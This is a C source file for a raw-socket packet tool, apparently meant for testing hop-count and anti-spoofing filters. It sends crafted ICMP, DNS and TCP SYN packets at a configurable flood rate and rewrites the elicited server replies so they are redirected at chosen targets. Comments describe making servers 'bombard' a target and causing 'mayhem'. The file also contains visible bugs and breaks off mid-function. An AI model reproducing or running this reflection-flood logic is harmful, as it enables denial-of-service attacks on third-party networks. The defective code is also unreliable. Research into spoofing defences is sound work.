#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<unistd.h>

#include<signal.h>

#include<sys/socket.h>
#include<sys/types.h>
#include<linux/if_packet.h>
#include<linux/if_ether.h> //<net/ethernet.h> for user space

#include<sys/ioctl.h>
#include<linux/if.h>	//<net/if.h> for user space
#include<netinet/in.h>

#include<errno.h>

#include"ft_list.h"
#include"ft_packet.h"

#define MAX_DELAY	50000	// 0.05 second delay that would reflect normal traffic (or slow rate)
#define MIN_DELAY	40


struct rtss_trgt {
	struct rtss_trgt *prev;
	struct rtss_trgt *next;

	unsigned int addr;//daddr in all linked flows should identical
	linked_list_t flwls;//description of traffic towards the target
};

struct ip4_flow {//ip4_flow is misleading, net_flow is a more accurate name
		//and should support both ipv4 and ipv6
	struct ip4_flow *prev;
	struct ip4_flow *next;

	/*flow key, in network byte-order*/
	unsigned int saddr;
	unsigned int daddr;
	unsigned short sport;
	unsigned short dport;
	unsigned char proto;
	unsigned char version;

	struct ip4_flow *rev_flw;//may not be used 
	struct ip4_flow *map_flw;
};
#define FLOWKEYSZ	14

struct app_info {
#define RTSS_APP_DNS	1
#define RTSS_APP_NTP	2
#define RTSS_APP_HTTP	3

	unsigned char code;
	unsigned char subcode;
	unsigned char data_flag;
	union {
		struct {
		  union{
		    dns_quest quest;
	    	    dns_rr record;
		  }u;	    
		}dns;


		//ntp;
		//http_hdr http;
	}u;

};
#define __dns	u.dns.u

//HERE: continue rtss_flow structure
struct rtss_flow {
	//ip4/6_flow
	struct ip4_flow net_flow; //later will support both ip4 and ip6 addresses

//	struct l3_flowext; //additional l3 info
				//(ToS, options, fragmentation)

//	struct l4_flowext;	//additional l4 info
				//(tcp flags, tcp sequence and acknowledge, udp_chksum flag,
					//icmp chksum flag,
					//icmp id and sequence)

	struct app_info app;

	char *app_data;//pointer to app data/payload

	struct rtss_flow *rev_flw;
	struct rtss_flow *map_flw;

	struct rtss_trgt *trgt; //target back pointer
};


char edge_rtr_ifname[20];
char isp_rtr_ifname[20];

char *edge_rtr_mac = "\x00\xe0\x4c\x53\x44\x58";
char *rtss_edge_mac = "\x00\x1e\x33\x28\x21\xb4";
char *isp_rtr_mac =  "\x44\xfb\x5a\xd2\x07\xa5"; //"\xba\x13\x58\xf2\x12\x80"
char *rtss_isp_mac = "\x5c\xac\x4c\x09\x4f\xb3";


struct sockaddr_ll edge_rtr_sll;
struct sockaddr_ll isp_rtr_sll;

//socket pair to allow for a generic recv function
//(if the recv socket is equal to socket1 then
//send on socket2 and vice versa

unsigned int edge_rtr_sfd;
unsigned int isp_rtr_sfd;
unsigned int rtss_send_delay = MIN_DELAY * 6;


linked_list_t tlist;
linked_list_t isp_flwls;
linked_list_t edge_flwls;



char target_num_ascii[10];
unsigned int target_num;


set_rate(int rate) {
	unsigned flood_delay;

	switch(rate) {
		case 10:
			flood_delay = MIN_DELAY;
			break;
		case 9:
			flood_delay = MIN_DELAY * 2;
			break;
		case 8:
			flood_delay = MIN_DELAY * 4;
			break;
		case 7:
			flood_delay = MIN_DELAY * 5;
			break;
		case 6:
			flood_delay = MIN_DELAY * 6;
			break;
		case 5:
			flood_delay = MAX_DELAY / 6;
			break;
		case 4:
			flood_delay = MAX_DELAY / 5;
			break;
		case 3:
			flood_delay = MAX_DELAY / 4;
			break;
		case 2:
			flood_delay = MAX_DELAY / 2;
			break;
		case 1://MAX_DELAY (slowest rate provided)
		default:
			flood_delay = MAX_DELAY; //this should reflect the normal traffic rate (minimum speed)
	}

	rtss_send_delay = flood_delay;
}

int
init_lists() {
	ls_init(&tlist);
	ls_init(&isp_flwls);
	ls_init(&edge_flwls);
}

add_flow(FILE *fp, struct rtss_trgt *target) {
//printf("add flow\n");
	char line[100];
	char temp[20];
	struct rtss_flow *flow = malloc(sizeof(struct rtss_flow));
	memset(flow, 0x0, sizeof(struct rtss_flow));

	//the type of traffic to target them with
	while(fgets(line, 50, fp) ) {
		if(fnmatch("*,*", line, 0) == 0) break;
		
		if(!fnmatch("\taddr: *", line, 0)) {//addresses	
			sscanf(line, "\taddr: %s", temp);
			flow->net_flow.saddr = inet_addr(temp);
				// (or dynamically determined through DNS if hostname is given,
				//although this will complicate	things unnecessarily now)
		}else
		if(!fnmatch("\tproto: *", line, 0)) {
			sscanf(line, "\tproto: %s", temp); //transport protocol
			flow->net_flow.proto = atoi(temp);
		}else
		if(!fnmatch("\tdport: *", line, 0) ) {
			sscanf(line, "\tdport: %s", temp); //target port services
			flow->net_flow.dport = htons(atoi(temp));
		}else
		if(!fnmatch("\tsport: *", line, 0) ) {
			sscanf(line, "\tsport: %s", temp); //services
			if(flow->net_flow.proto == IPPROTO_ICMP) //dont swap bytes for icmp
				flow->net_flow.sport = atoi(temp);
			else
				flow->net_flow.sport = htons(atoi(temp));
		}else
		if(!fnmatch("\tapp: *", line, 0) ) {
			sscanf(line, "\tapp: %s", temp);
			int length;
			if(fnmatch("dns_q.*", temp, 0) == 0) {
				flow->app.code = RTSS_APP_DNS;
				flow->app.subcode = 0;// 1 for dns_iq
				flow->app.__dns.quest.qname = malloc(MAX_DNS_QUERY);
				memset(flow->app.__dns.quest.qname, 0x0, MAX_DNS_QUERY);
				sscanf(temp, "dns_q.%s", flow->app.__dns.quest.qname);
				
				length = str_to_dname(temp+6, flow->app.__dns.quest.qname, strlen(temp)-6);
				flow->app.__dns.quest.qlen = length + 2; // a byte at the beginning and null byte at the end
				flow->app.__dns.quest.qtype = 1;
				flow->app.__dns.quest.qclass = 1;	
			//DBG	
				char *temp2 = flow->app.__dns.quest.qname;
				int i = 0;
				while( i < length + 1) printf("qname[i]: %x\n", temp2[i++]);
			//END DBG
			}else
			if( fnmatch("dns_iq.*", temp, 0) == 0) {
			
			}
		}
	}

	flow->net_flow.daddr = target->addr;
	flow->net_flow.version = 4;
	ls_add(&target->flwls, flow);
printf("flow info\n");
printf("ip version: %x\n", flow->net_flow.version);
printf("saddr: %x\n", flow->net_flow.saddr);
printf("daddr: %x\n", flow->net_flow.daddr);
printf("sport: %x\n", flow->net_flow.sport);
printf("dport: %x\n", flow->net_flow.dport);
printf("proto: %x\n", flow->net_flow.proto);
if(flow->app.code){
	printf("app: DNS\n");
	printf("query: %s\n", flow->app.__dns.quest.qname);
}

}

get_trgt_cfg(FILE *fp) {
//printf("get_trgt_cfg\n");
//how to specify multiple traffic desc for a single target
    //    in configuration file?
	char line[100];
	char temp[20];
	struct rtss_trgt *target = malloc(sizeof(struct rtss_trgt));
	memset(target, 0x0, sizeof(target));

	while(fgets(line, 50, fp)) {

		if(fnmatch("*;*", line, 0) == 0) break;

		if(!fnmatch("\taddr: *", line, 0)) {//address
			sscanf(line, "\taddr: %s", temp);
			target->addr = inet_addr(temp);
		}else
		if(!fnmatch("\ttrfc:*", line, 0)) {
			add_flow(fp, target);
		}
	}

	ls_add(&tlist, target);
}

get_cfg(char *fname) {

	FILE *fp;
	char line[100];
	char temp[5];

	fp = fopen(fname, "r");

	while( fgets(line, 50, fp) ) {
		//EdgeRtr side interface name
		if( !fnmatch("EdgeRtr_IF: *", line, 0) ) {
			sscanf(line, "EdgeRtr_IF: %s", edge_rtr_ifname);
		}else

		//ISP Rtr side interface name
		//EdgeRtr side interface name
                if( !fnmatch("ISP_Rtr_IF: *", line, 0) ) {
                        sscanf(line, "ISP_Rtr_IF: %s", isp_rtr_ifname);
                }else

		//sending rate
		if( fnmatch("rate: *", line, 0) == 0) {
			sscanf(line, "rate: %s", temp);
			set_rate(atoi(temp));
		}else

		/*targets in the network*/
		//target info
		if( !fnmatch("target:*", line, 0) ) {printf("adding target\n");
			get_trgt_cfg(fp);
		}
	}
}

get_rev_flow(struct rtss_flow *flow, struct rtss_flow *rev_flow) {
	unsigned type;

	rev_flow->net_flow.version = flow->net_flow.version;
	rev_flow->net_flow.saddr = flow->net_flow.daddr;
	rev_flow->net_flow.daddr = flow->net_flow.saddr;
	rev_flow->net_flow.proto = flow->net_flow.proto;
	if(rev_flow->net_flow.proto == IPPROTO_ICMP) {//dont swap sport and dport for icmp flows
		type = flow->net_flow.sport & 0xff;
		switch(type) {
			case ICMP_ECHOREP: //swap reply for request, code = 0
				rev_flow->net_flow.sport = ICMP_ECHO;
				break;
			case ICMP_ECHO: //swap request for reply
				rev_flow->net_flow.sport = ICMP_ECHOREP;
				break;
			//other cases
			//case mask request:
			//	replace reply for request and vice versa
			//case timestamp:
			//	//bla;
			//case router discovery:
			//	replace solicitation for advertisement and vice versa
			//	blabla;
			//	break;
			//case destination unreachable
			//	blablabla
			//	break;
			//case parameter problem:
			//	foobar
			//	break;
			default:
				;
		}
		//is this common for icmp types??
		rev_flow->net_flow.dport = flow->net_flow.dport;
	}else { //swap ports for udp and tcp (what about others? not supported)
		rev_flow->net_flow.sport = flow->net_flow.dport;
		rev_flow->net_flow.dport = flow->net_flow.sport;
	}


	return 0;
}

build_app_mapping
(struct app_info *origin, struct app_info *copy, struct app_info *map) {

	switch(copy->code = origin->code) {
		case RTSS_APP_DNS:
			copy->subcode = origin->subcode;//at the moment, only standard query is assumed
			memcpy(&copy->__dns, &origin->__dns, sizeof(origin->__dns));

			//map flow app info
			map->code = origin->code;
			map->subcode = origin->subcode;
			memcpy(&map->__dns, &origin->__dns, sizeof(origin->__dns));
			break;
		default:;
	}
}

build_flow_mapping() { printf("build_flow_mapping()\n");
	/*
	the lists of flows of each target is used
	to construct the edge_flwls,
	each flow in edge_flwls points to
	a flow in isp_flwls which has dst address
	of server to contact, which is the src addr
	of its map flow in edge_flwls,
	and has the src address, as the address
	belonging to the ISP Rtr's subnet, 
	or RTSS machine's IP on ISP Rtr's side
	*/

	struct rtss_trgt *trgt_nd;
	struct rtss_flow *flw_nd;
	struct rtss_flow *edge_nd;
	struct rtss_flow *isp_nd;
	struct ifreq ifr;
	struct sockaddr_in *sock_addrp;

	while(trgt_nd = ls_fetch(&tlist)) {printf("new target\n");
		while(flw_nd = ls_fetch(&trgt_nd->flwls)) { printf("adding traffic description\n");
			edge_nd = malloc(sizeof(struct rtss_flow));//one node for edge_flwls
			isp_nd = malloc(sizeof(struct rtss_flow)); //one node for isp_flwls
			
			//copy flw_nd to edge_nd
			edge_nd->net_flow.saddr = flw_nd->net_flow.saddr;
			edge_nd->net_flow.daddr = flw_nd->net_flow.daddr;
			edge_nd->net_flow.sport = flw_nd->net_flow.sport;
			edge_nd->net_flow.dport = flw_nd->net_flow.dport;
			edge_nd->net_flow.proto = flw_nd->net_flow.proto;
			edge_nd->net_flow.version = flw_nd->net_flow.version;

			//isp_nd is the map, check above paragraph
			strcpy(ifr.ifr_name, isp_rtr_ifname);
			ioctl(isp_rtr_sfd, SIOCGIFINDEX, &ifr);
			ioctl(isp_rtr_sfd, SIOCGIFADDR, &ifr);//will not if networkManager is not working,
								//since DHCP will not be working and interface
								//wont have an IP address
			
			sock_addrp = &ifr.ifr_addr;

			isp_nd->net_flow.saddr = (unsigned int) sock_addrp->sin_addr.s_addr;//this machine's IP on ISP Rtr's side
			isp_nd->net_flow.daddr = edge_nd->net_flow.saddr;//the server
			isp_nd->net_flow.proto = edge_nd->net_flow.proto;
			if(isp_nd->net_flow.proto == IPPROTO_ICMP) { //dont swap sport and dport for icmp
				isp_nd->net_flow.sport = edge_nd->net_flow.sport;
				isp_nd->net_flow.dport = edge_nd->net_flow.dport;
			}else { //swap for others
				isp_nd->net_flow.sport = edge_nd->net_flow.dport;
				isp_nd->net_flow.dport = edge_nd->net_flow.sport;
			}
			isp_nd->net_flow.version = edge_nd->net_flow.version;


			//copy application info from target's flows to edge flow node,
			//and map to isp flow node
			build_app_mapping(&flw_nd->app, &edge_nd->app, &isp_nd->app);
	
			//link them
			edge_nd->map_flw = isp_nd;
			isp_nd->map_flw = edge_nd;

			ls_add(&edge_flwls, edge_nd);
			ls_add(&isp_flwls, isp_nd);

			//free the list of flows of each target
			//ls_del(&trgt_nd->flwls, flw_nd);
			//free_rtss_flow(flw_nd);
		}
		//free list of targets
		//ls_del(&tlist, trgt_nd);
		//free_rtss_trgt(trgt_nd);
	}
/*
NOTE: freeing of targets and their lists of rtss_flows
	      might be uncommented to free space later,
	      but I'm not sure whether that would interfere
	      with ls_fetch() and even cause malfunction*/

}

setup_socket(int *sockfd, char *devname/*, struct sockaddr_ll *sll*/) {

	struct sockaddr_ll sll;
	struct ifreq ifr;

	memset(&sll, 0x0, sizeof(struct sockaddr_ll));
	memset(&ifr, 0, sizeof(ifr));
 
	*sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL)); //may later change to ETH_P_ALL
									//btw what happens if I set it to zero?
	strcpy(ifr.ifr_name, devname); printf("%s\n",devname);

	if( ioctl(*sockfd, SIOCGIFINDEX, &ifr) < 0) {//get interface index
		printf("fatal chinit: error getting ifindex:\t%s\n",strerror(errno));
		exit(1);
	}
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL); //may later change it to ETH_P_ALL
	sll.sll_ifindex = ifr.ifr_ifindex;
	
//NOTE: not really sure whether ioctl() gives a damn socekts
//            are bound to the interface or not for these SIOCG & SIOCS calls,
//            but the call to get interface index was done before binding the socket anyway
//            so I really am confused about this
            (or perhaps ioctl() does an implicit binding
            	since the call is done with a socket and an interface name
            	so it's possible it binds them if they aren't bound already)
		(just like connect() does implicit binding, I think)

	bind(*sockfd, &sll, sizeof(struct sockaddr_ll));

	if( ioctl(*sockfd, SIOCGIFFLAGS, &ifr) < 0) {
		printf("fatal error getting interface flags\n");
		exit(1);
	}
	
	ifr.ifr_flags |= IFF_UP;// | IFF_PROMISC; //promiscuous mode is not necessary at this point

	if( ioctl(*sockfd, SIOCSIFFLAGS, &ifr) < 0) {
		printf("fatal error bring interface up\n");
		exit(1);
	}
}

setup_rtss_sockets() {


//	memset(&isp_rtr_sll, 0x0, sizeof(struct sockaddr_ll));
//	memset(&edge_rtr_sll, 0x0, sizeof(struct sockaddr_ll));

//        memcpy(&isp_rtr_sll.sll_addr, isp_rtr_mac, isp_rtr_sll.sll_halen = ETH_ALEN);
//	memcpy(&edge_rtr_sll.sll_addr, edge_rtr_mac, edge_rtr_sll.sll_halen = ETH_ALEN);

	setup_socket(&edge_rtr_sfd, edge_rtr_ifname);//, &edge_rtr_sll);
	setup_socket(&isp_rtr_sfd, isp_rtr_ifname);// , &isp_rtr_sll);
}

int
get_pkt_rtssflow(char *pkt, struct rtss_flow *flow) {

/*
IMPORTANT:
	matching icmp requests and replies will need special handling,
	unlike udp and tcp, you cant just swap sport and dport for reverse flows,
	and even if you don't swap the bytes, you can't just check whether their
	values are equal, each icmp type needs a specific kind of handling

	(although it was my intention to thoroughly understand icmp,
	 it wasn't planned until implementing layer 4 protocols based attacks)

	Now, I have one of two choices in this regard, either go to udp packets,
	since handling of udp flows will be much simpler, or,
	use the momentum in icmp, even though it's a little bit more complicated,
	but also the operation of udp (and tcp?) relies on icmp, since icmp is
	an integral part of ip

IMPORTANT:
	for this task, I need to differentiate between handling that is
	necessary for the correct functioning of icmp and functionality
	and handling that is sufficient for the purpose of this program,
-->>	in other words, what the bare minimum special handling of icmp
	packets needed for achieving the purpose of this program?
*/

/*as of yet, the application header and data will be mapped
  with no modification, until a need arises for that
*/

	struct ethhdr *eth = pkt;
	iphdr *ip = pkt + ETH_HLEN;
	struct ip4_flow *ipflw = flow;
	icmphdr *icmp;
	udphdr *udp;
	unsigned char *temp;

	switch(ntohs(eth->h_proto)) {
		case ETH_P_IP:
			ipflw->version = 4;
			ipflw->saddr = ip->saddr;
			ipflw->daddr = ip->daddr;
			ipflw->proto = ip->proto;
			break;
		case ETH_P_IPV6:
			//later
			break;
		default:
			return -1;
	
	}

	switch(ipflw->proto) {
		case IPPROTO_ICMP:
			icmp = (char *) ip + sizeof(iphdr);
			temp = &ipflw->sport;
			temp[0] = icmp->type;//lower memory holds most significant byte for network byte order
			temp[1] = icmp->code;//and vice versa
			ipflw->dport = icmp->id; //should hold id and sequence later(provided by configuration file)
			//is it necessary to check for sequence? maybe later
			break;
		case IPPROTO_TCP:
		case IPPROTO_UDP:
			udp = (char *) ip + sizeof(iphdr);
			ipflw->sport = udp->sport;
			ipflw->dport = udp->dport;
			break;
		default:
			;
	}
	
	//more info later

	return 0;
}

struct rtss_flow *
map_flow(linked_list_t *ls, struct rtss_flow *key_flow) {
	struct rtss_flow *flow;

	flow = ls_search(ls, &key_flow->net_flow.saddr, FLOWKEYSZ);

	return flow->map_flw;
}

build_app_hdr(char *buf, struct app_info *app) {
printf("build app hdr -> query: %s\n", app->__dns.quest.qname);
	switch(app->code) {
		case RTSS_APP_DNS:
			//use flags to determine whether query or response
		//currently only queries are supported
			build_dns_quest(buf + DNS_HLEN, &app->__dns.quest);
			build_dns_hdr(buf, app->subcode);//only bare minimal functionality is supported
								//at the moment
			break;
		//case RTSS_APP_NTP:
			//break;
		//case RTSS_APP_HTTP:
			//break;
		default:
			//either dummy data or nothing,
			//     probably dummy data
			;
	}
//DBG
	     int i=0;
	//char *buffer = buf + DNS_HLEN;
       	     //while(i < app->__dns.quest.qlen)
	     // printf("bomba[i]: %x\n", buffer[i++]);
//END DBG
}


/*	the purpose of this program was to direct real traffic towards targets.
	we only need to send icmp, udp and tcp, for our current purpose, of testing HCF,
	later maybe other anti-spoofing mechanisms, the application data is irrelevant at the moment,
	later it may become relevant
*/
	//first use to elicit icmp echo reply
	//second use to elicit udp packets (either DNS or NTP)

	//third what's the simplest tcp application?
        //later DNS/UDP, DNS/TCP, HTTP/TCP

//make as generic as possible
rtss_send_pkt(int sockfd, struct rtss_flow *rtssflow, char *dst_mac, char *src_mac) { printf("rtss_send_pkt()\n");
/*

NOTE: some header info in rtss_flow structure might be missing or corrupt,
      should implement chk_trfc_semantics()
*/
	struct sockaddr_ll sll;
	char *pkt = malloc(ETH_FRAME_LEN);
	char *l3_hdr = pkt + ETH_HLEN;
	char *l4_hdr;
	struct ip4_flow *flow = &rtssflow->net_flow;
	unsigned int ip_datalen = 0;
	unsigned int opt_len = 0;
	unsigned int send_len;
	unsigned char type, code; //icmp
	unsigned short eth_type;
	char *databuf = NULL;//or app_hdr
        unsigned int datalen = 0;



//TEMP
/*
printf("ip version: %x\n", flow->version);
printf("saddr: %x\n", flow->saddr);
printf("daddr: %x\n", flow->daddr);
printf("sport: %x\n", flow->sport);
printf("dport: %x\n", flow->dport);
printf("proto: %x\n", flow->proto);
*/
//END TEMP


	printf("app code: %d\n", rtssflow->app.code);
	if(rtssflow->app.code) { printf("preparing app hdr\n");
		databuf = malloc(1473); //max data length is for ip+udp packet ETH_FRAME_LEN - 42 = 1473
		memset(databuf, 0x0, 1473);
		build_app_hdr(databuf, &rtssflow->app);
	//TEMP
		datalen = DNS_HLEN;
		datalen += rtssflow->app.__dns.quest.qlen + 4;//4 bytes for query type & class
		//datalen++; //include the zero byte in query name
	//END TEMP
	//
	//DBG
		//char *buffer = databuf + DNS_HLEN;//rtssflow->app.__dns.quest.qname;
		//int pinky = 0;
		//while(pinky < rtssflow->app.__dns.quest.qlen) printf("buffer[i]: %x\n", buffer[pinky++]);
	//END DBG
	}


	if(flow->version == 4)
		l4_hdr = l3_hdr + sizeof(iphdr);
	else
	if(flow->version == 6)
		l4_hdr == l3_hdr + sizeof(ip6hdr);
	else
		return -1;

	memset(pkt, 0x0, ETH_FRAME_LEN);

	//build transport header
	switch(flow->proto) {
		case IPPROTO_ICMP:
		//TEMP
			databuf = malloc(8);
			memset(databuf, "x", datalen = 8);

		//END TEMP

			//icmp type and code are taken from flow's src port
			//type in lower memory and code in higher memory
			//as they would be in a packet's buffer
			type = flow->sport & 0xff;
			code = flow->sport >> 8;
		//printf("icmp type (hexa): %x\n", type);
			build_icmp_hdr(l4_hdr, type, code, flow->dport, databuf, datalen);
			ip_datalen += ICMP_HLEN + datalen;
		printf("ipdatalen %d\n", ip_datalen);
		
			/*NOTE: on icmp, echo reply is probably the only
                        kind of icmp traffic we might be able
                        to make the servers send to targets,
                        but also it's probably the only, along with echo request,
                        type icmp traffic that a protected host should
                        receive from a legitimate peer (right?)*/
			break;
		case IPPROTO_UDP:
			build_udp_hdr(l4_hdr, l3_hdr, ntohs(flow->sport),
				ntohs(flow->dport), databuf, datalen, 0);//the datalen and buf order should be swapped
			//2nd milestone
			//udp checksums??
			ip_datalen += sizeof(udphdr) + datalen;
			printf("udp, ipdatalen: %d\n", ip_datalen);
			break;
		case IPPROTO_TCP:	
			build_tcp_hdr(l4_hdr, l3_hdr, ntohs(flow->sport), ntohs(flow->dport), 
				SYN, databuf, datalen, 1);
			//ip_datalen += sizeof(tcphdr);
			/*NOTE: on tcp, I could trick the server(s) to bombard
                	a target with SYN/ACK packets, regardless
                	of data on top*/
			ip_datalen += sizeof(tcphdr) + datalen;
			break;
		default:
			//?
			;
	}

	//build network header
	
	//only ipv4 is supported now
	build_ip_hdr(l3_hdr, 0, ip_datalen,
			0, 0, 64,
			flow->proto,
			1,//chksum_flg (zero -> leave zero)
			ntohl(flow->saddr),
			ntohl(flow->daddr),
			opt_len);

	//case ipv6 (add later)
        //build_ip6_hdr();

        //add more network layer headers later, if ever
/*
do I have to construct wifi header?! FUCK, 
	yes I want to know how to do it but is now the time for it?

	one of two choices:
		1.spend a lot of time with wlan headers, or
		2.use AF_INET, SOCK_RAW,
			will need a little time to review forgotten details in UNP,
			BUT using this setup, I will not be able to bind the socket
			to an interface
		3.use AF_PACKET, SOCK_DGRAM, ETH_P_ALL
			this sounds like the most suitable to this programs purpose,
			but I couldn't get the SOCK_DGRAM version of AF_PACKET socket
			to work last time I tried it
				then beat it to submission, OWN IT.

---------------------------
	Quick summary on socket creation options:

		AF_PACKET, SOCK_RAW -->> send and receive packet to and from driver directly
		AF_PACKET, SOCK_DGRAM -->> send/recv packet without physical layer header (starting from network header)
		AF_INET, SOCK_RAW + IP_HDRINCL -> send/recv packet starting from l3, but ip checksum is checked
							by kernel on receive, and cant bind to an interface,
							(and, not sure about this one, but I think only works with sendto and recvfrom
							 or sendmsg and recvmsg, to be able to read sockaddr structure)
		AF_INET, SOCK_RAW (without IP_HDRINCL) -> send/recv packet starting from l4
		AF_INET, SOCK_DGRAM/STREAM		-> send/recv packet starting from application (data after l4 header)
------------------------------------------------
*/

	if(flow->version == 4)
		eth_type = ETH_P_IP;
	else
		eth_type = ETH_P_IPV6;
	
	//build datalink header
	build_eth_hdr(pkt, dst_mac, src_mac, eth_type);

//needs modification for ipv6 -->>
	send_len = ETH_HLEN + sizeof(iphdr) + opt_len + ip_datalen;



/*IMPORTANT: apparently the wifi frames passed to the program are identical
		   to ethernet frames,
		      perhaps the complete frames are only handled by the hardware and/or driver,
		      like preamble and FCS in Ethernet, they are not considered part of Datalink frames
			so the physical layer frames are different for ethernet and wlan, but
			the datalink frames are identical,
		      either that or the kernel removes wlan specific fields from
			      frames when receiving and adds them when sending
*/

	if( 0 > send(sockfd, pkt, send_len, 0) ) {
		printf("bullshit\n");
		exit(-1);
	}

	free(pkt);
	if(databuf) free(databuf);
}


//receive signal handler (ISP Rtr sockfd) 
                //.receive response traffic (on ISP Rtr sockfd)
                        //.for each packet
                                //.lookup which real traffic and service is inteneded for which target(s)
                                //.replace dst addresses with intended target for each
                                        //& send result packet on EdgeRtr sockfd
int 
rtss_recv_pkt(int sockfd) { 


#define RTSS_PKT_OUTGOING	-2
#define RTSS_PKT_IRRELEVANT	-3
#define RTSS_IPVER_UNSUP	-4
#define RTSS_BAD_SOCKET		-5
#define RTSS_BAD_ETHTYPE	-6

//	check for PACKET_OUTGOING when receiving
	//i think is only used for looped back packets
	//
	//what would cause a packet to be looped back after being
	//delivered to the network interface driver?


	//IMPORTANT:
	//are sent packets looped back to packet socket if interface is in
	//promiscuous mode?
	//	Yes, but not any sent packet,
	//	only packets that were not sent by this process (or the same socket which is used for receive)
	//	that is, packets sent on this socket are not looped back and received on this socket,
	//	but packets sent on the same interface this socket is bound to will be looped
	//	back to this socket,
	//	probably the purpose for this is to allow the kernel to monitor
	//	and diagnostic programs like tcpdump to be read what is happening on the bound interface
	//
	//	but i'm not sure about whether if two or more sockets of the same process
	//	are bound to the same interface and one of them is used to send a packet
	//	will the packet be looped back to the other socket(s) or not
	//	in other words, I'm not sure whether this is an inter-process or inter-socket
	//	thing
	//	(althoug I don't know why would a single process bind more than one socket
	//	to the same interface)
	//
	//what about packets sent by another socket on the same interface
	//but the interface is not in promiscuous mode? will it be looped back?
	//	YES

//PACKET_OUTGOING should be either checked or
        //set (I think checked) when a recv signal
        //is caught on isp_rtr_sockfd, since the program
        //will be both sending and receiving on that interface
        //
        //NOTE: I didn't need to do that on ddos-ps sockets
        //      because three of the four interfaces used
        //      use link layer sockets and two of them
        //      are only used for receiving
        //      and only one (injection interface) is used
        //      for sending
        //
        //      however, if the program might be running
        //      with other programs, we better start
        //      differentiating traffic,
        //#-->> or telling the kernel to restrict any
        //      other process from having access to
        //      the three interfaces using link layer
        //      sockets (sensor, analyzer and injection)
	//	how it should be run on a dedicated machine,
	//	or at least the four used interfaces
	//	shouldnt be accessed by any other process (is this kernel locking??)
	//
	//does bind() cause the sockaddr structure to be copied to the socket structure
	//whose socket file descriptor was passed as sockfd (first) argument to bind???

	linked_list_t *ls;
	struct rtss_flow *flow = malloc(sizeof(struct rtss_flow));
	struct rtss_flow *rev_flow = malloc(sizeof(struct rtss_flow));
	struct rtss_flow *found_flow;
	struct rtss_flow *map_flow;
	char *pkt = malloc(ETH_FRAME_LEN);
	char *l3_hdr = pkt + ETH_HLEN;
	char *l4_hdr;
	iphdr *ip;
	icmphdr *icmp;
	udphdr *udp;
	tcphdr *tcp;
	unsigned short frame_len, eth_type;
	unsigned int output_sfd, ip_datalen;
	struct sockaddr_ll *sll;
	char *recv_if_mac;
	char *send_src_mac, *send_dst_mac;

	struct pseudo_hdr *phdr = malloc(sizeof(struct pseudo_hdr));
	memset(phdr, 0x0, sizeof(struct pseudo_hdr));

	//depending on which interface
        //the packet was received on,
        //decide the list to lookup,output interface,
	//dst and src macs,
	//NOTE: sll is no longer needed in this function

//PERFORMANCE: better to do these operations
//		after receiving the packet from the socket
//		without error
	if(sockfd == isp_rtr_sfd) {
                ls = &isp_flwls;
                output_sfd = edge_rtr_sfd;
		sll = &isp_rtr_sll;

		recv_if_mac = rtss_isp_mac;
		send_src_mac = rtss_edge_mac;
		send_dst_mac = edge_rtr_mac;
        }else
        if(sockfd == edge_rtr_sfd) {
                ls = &edge_flwls;
                output_sfd = isp_rtr_sfd;
		sll = &edge_rtr_sll;

		recv_if_mac = rtss_edge_mac;
		send_src_mac = rtss_isp_mac;
		send_dst_mac = isp_rtr_mac;
        }else
        return RTSS_BAD_SOCKET;


	if( 0 > (frame_len = recv(sockfd, pkt, ETH_FRAME_LEN, MSG_DONTWAIT) )) {
		printf("error receiving: %s\n", strerror(errno));
		return -1;
	};
	


	
	if( memcmp(recv_if_mac, pkt + ETH_ALEN, ETH_ALEN) == 0) { printf("outgoing pkt\n");
		//free allocated resources
		return RTSS_PKT_OUTGOING;
	}
/*
NOTE: if the interface is not in promisuous mode, multicast and broadcasts
	will still be received, if stations share a common ethernet bus
	or  wlan

	should follow the above memcmp() by a comparison
	between destination mac address and broadcast and multicast addresses

	this (AF_PACKET + SOCK_RAW + ETH_P_ALL) kind of socket is teaching me
	how to write programs that operate in the wilderness, which is very good
	, and also good that it's operating on a wireless interface which results
	in traffic being similar to that of ethernet stations sharing a common bus,
	which I didnt experience before, only experienced point-to-point ethernet hitherto
*/

	if(get_pkt_rtssflow(pkt, flow) < 0) {printf("bad ethtype\n"); return RTSS_BAD_ETHTYPE;
	}

	//reverse flow (which packet caused this packet/response to be sent)
	get_rev_flow(flow, rev_flow);

	found_flow = ls_search(ls, &rev_flow->net_flow.saddr, FLOWKEYSZ);

	if(!found_flow) { //irrelavant packet
		printf("flow not found\n");
		//free allocated resources
		return RTSS_PKT_IRRELEVANT;
	}
printf("flow found\n");

	map_flow = found_flow->map_flw;

	if(map_flow->net_flow.version == 4) {
		eth_type = ETH_P_IP;
		ip = l3_hdr;
                l4_hdr = l3_hdr + (ip->hl << 2);

	}else
        if(map_flow->net_flow.version == 6) {
		eth_type = ETH_P_IPV6;
		//ip6 = l3_hdr;
                l4_hdr == l3_hdr + sizeof(ip6hdr);
	}
//HERE:
//should assign addresses according to ip version
	



	ip_datalen = ntohs(ip->tlen) - (ip->hl << 2);


//CHECK: should assign addresses according to ip version
	
	//update pkt according to map_flow (in this function)
	ip->v = map_flow->net_flow.version;
	ip->saddr = map_flow->net_flow.saddr;
	ip->daddr = map_flow->net_flow.daddr;
	ip->proto = map_flow->net_flow.proto;

	switch(ip->proto) {
		case IPPROTO_ICMP:// aslan hwa why do I need to modify l4 hdr for mapped icmp packets??
			//HERE should be structure l4_hdr, same for udp and tcp
			//IMPORTANT: switching the elicited icmp echo reply message to an echo request
			//will result in the target replying with an icmp echo to
			//the server/machine used to elicit (by rtss) the original icmp reply
			//consuming even more bandwidth (if the elicited response is
							//considered non-spoofed (technically it's nonspoofed)
							//this will cause mayhem (orchestrator of mayhem)
			icmp = l4_hdr;
			icmp->type = map_flow->net_flow.sport & 0xff;
			icmp->code = (map_flow->net_flow.sport & 0xff00) >> 8;
			//recompute checksum
			icmp->chksum = 0;
			icmp->chksum = in_chksum(icmp, ntohs(ip->tlen) - sizeof(iphdr));
			break;
		case IPPROTO_UDP:
			udp = l4_hdr;
			udp->sport = map_flow->net_flow.sport;
			udp->dport = map_flow->net_flow.dport;
			
			//recompute udp checksum
			phdr->saddr = ip->saddr;
			phdr->daddr = ip->daddr;
			phdr->zero = 0;
			phdr->len = htons(ip_datalen);
			phdr->proto = IPPROTO_UDP;
			
			udp->chksum = in_chksum(phdr, sizeof(struct pseudo_hdr));
